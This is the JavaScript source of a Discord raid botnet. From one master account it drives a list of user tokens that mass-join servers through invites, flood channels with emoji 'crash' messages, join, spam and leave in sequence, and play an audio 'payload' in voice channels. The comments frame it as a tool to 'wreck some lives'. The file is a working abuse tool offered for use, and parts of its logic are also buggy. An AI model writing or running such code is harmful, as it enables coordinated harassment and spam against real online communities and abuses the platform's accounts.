const Discord = require("discord.js");
var client = new Discord.Client();
var Request = require('request');
var fs = require('fs');

//fill this array with account tokens for your botnet

var tokens = [
	];
   
//this will get filled with bot clients on /borg   
var clients = [];//init var dont touch!!!

var botnum = tokens.length;

function botnumber(int,m)
{
	botnum = int-1;
	m.reply('number of active bots = ' + (botnum + 1));
}

function msglen(int,m)
{
	config.msglen = int;
	m.reply("msg length set to : "+config.msglen);
	return; 
}

const streamOptions = { seek: 0, volume: 1 };

var config = {
token: "YOUR PERSONAL TOKEN",	//your token

username: "YOUR USERNAME",														//your username
rektness: 2, 															//amount of crash messages sent per token. 
audiopayload: "./ree.mp3", 												//audio payload for /ree
msglen: 10
};


client.on('ready',()=>{ console.log('ready to wreck some lives.....');	});


//The Message Handler
client.on('message', m => {

    if (m.author.username == config.username)
    {
      var cmd = m.content.split(" ");
      
      
    //Usage: /botnum {INT}  
    if (cmd[0] == "/botnum")
		{
		botnumber(cmd[1],m);
		return;
		}  
	
	//Usage: /msglen {INT}
	if (cmd[0] == "/msglen")
		{
		msglen(cmd[1],m);
		return;
		}  
		
    //Usage: /join {INVITE}
    if (cmd[0] == "/join")
    {
          
	var	invite = cmd[1];
	invite = invite.replace("https://discord.gg/","");
    
	var i = 0;
    tokens.forEach(function(token) 
    {if (i > botnum) return;
				join(invite, token); i++;
    });
    m.delete();
    return;
    }
    
    //Usage: /crash {chanid}
    if (cmd[0] == "/crash")
    {
    var   chanid = cmd[1];
	
    var i = 0;
    tokens.forEach(function(token) { if (i > botnum) return;
        for (var i =0; i < config.rektness; i++)
        {
		var str = randstr();
		spam(chanid, str,token);
        }
        i++;
    });
    m.delete();
    return;
    
    }
    
    // Usage: /borg
    // summon the borg to life. 
    if (cmd[0] == "/borg")
    {
        //create the borg
        clients = borg(tokens);
        //login each borg
        var i = 0;
        clients.forEach(function(bot) {
            bot.client.login(bot.token);
            bot.client.on('ready',()=>{ 
                console.log('borg number '+i+' ready!');
                i++;
            });
        });
        console.log('All Borg Units Online! ');
    m.delete();
    return;
    }
    
    
    //usage /ree {GUILDID} {VCID}
    // play the audio payload to desired vcid
    if (cmd[0] == "/ree")
    {
        var guildid = cmd[1];
        var vcid = cmd[2];
        
        ree(guildid,vcid);
    }
    
    //usage: /jc {INVITE} {CHANID}
    // AKA "joincrash"
    if (cmd[0] == "/jc")
    {
		var	invite = cmd[1];
		invite = invite.replace("https://discord.gg/","");
		var chanid = cmd[2];
		tokens.forEach(function(token) {
                
				join(invite, token);
				var str = randstr();
				spam(chanid, str,token);
    });
	m.delete();
	return;	
	}
	
	//Usage: /jcl {INVITE} {GUILDID}/{CHANID}
	// AKA "Join Crash Leave"
	
	if (cmd[0] == "/jcl")
    {
		var	invite = cmd[1];
		invite = invite.replace("https://discord.gg/","");
		
		var ids = cmd[2].split("/");
		
		var chanid = ids[0];
		var guildid = ids[1];
		
		var i = 0;
		tokens.forEach(function(token) {
                if (i > botnum) return;
				join(invite, token);
				var str = randstr();
				
				
				setTimeout(
				()=>{
				spam(chanid, str,token);
				},1000);
				
				setTimeout(
				()=>{
				leave(token,guildid);
				}, 4000);
				
				i++;
    });
	m.delete();
	return;	
	}
	
	//Usage: /leave {GUILDID}
	
	if (cmd[0] == "/leave")
    {
		
		var guildid = cmd[1];
		tokens.forEach(function(token) {
               
				leave(token,guildid);
				
    });
	m.delete();
	return;	
	}
  
  }

});

function leave(token,guildid)
{
	  var Headers = { authorization: token };

        Request({
            method: 'DELETE',
            headers: Headers,
            uri:     "https://discordapp.com/api/v6/users/@me/guilds/"+guildid
        }, (Error) => {console.log(Error);});
       	console.log('Screw you im going home...');
}

function join(invite, token)
{ 
        var Headers = {
            authorization: token,
            'X-Context-Properties': 'eyJMb2NhdGlvbiI6Ik1hcmtkb3duIExpbmsifQ=='
        };

        Request({
            method: 'POST',
            headers: Headers,
            uri:     "https://discordapp.com/api/v6/invite/"+invite
        }, (Error, Response, Body) => {
           
            if(Body.message === 'You are being rate limited.') 
            {
                console.log('limited');
            }
			else
			{
			    console.log('joined!');
			}
       	});

}

function spam(chanid,payload,token)
{
	
    const Data = {
            content: payload,
            token: token
        }

        const Headers = {
            authorization: Data.token,
            'content-type': 'application/json'
        }

        Request({
            method: 'POST',
            headers: Headers,
            json:    Data,
            uri:      "https://discordapp.com/api/v6/channels/"+chanid+"/messages"
        }, (Error, Response, Body) => {
            
            
            if(Body.message === 'You are being rate limited.') 
            {
				console.log('limited');
			}
			else
			{
				console.log('rekt');
			}
        });
}

function borg(tokens)
{
    
    var clients = [];
    var i = 0;
    tokens.forEach(function(token) {
	if (i > botnum) return;
	clients.push(newclient(token));
	i++;
    });
    
    return clients;
}

function newclient(token)
{
    return {token: token, client: new Discord.Client()};
}

function ree(guildid, vcid)
{
 
    clients.forEach(function(bot) {
	
    var vc = bot.client.guilds.get(guildid).channels.get(vcid);
     
	vc.join()
 	.then(connection => {
   
    const dispatcher = connection.playFile(config.audiopayload);
   
   	console.log('NORMIES GET OUT!!!! REEEEEEEEEE!');
 	})
 	.catch(console.error);
        
    
    });
    
}

//return a string of emoji of length msg len
function randstr()
{
	var output = "";
	for (var i=0; i < config.msglen; i++	)
	{
		output += alpha[rand(0,squares.length)];
	}
	console.log(output);
	return output;
}

function rand(min, max) {
	min = Math.ceil(min);
	max = Math.floor(max);
	return Math.floor(Math.random() * (max - min)) + min;
}

//emoji spam

var alpha = ['🅰', '🅱',"☪","▶","3️⃣","🚩","↪","♓","ℹ","🗾","👌","1","Ⓜ","♑","🅾","🅿","❓","®","💲","✝","🖖","♈","👐","✖","🐰","💤"];

//targeted emoji spam
var squares = ["⬜","⬛","☠️"];

//log in the master account. 

client.login(config.token);


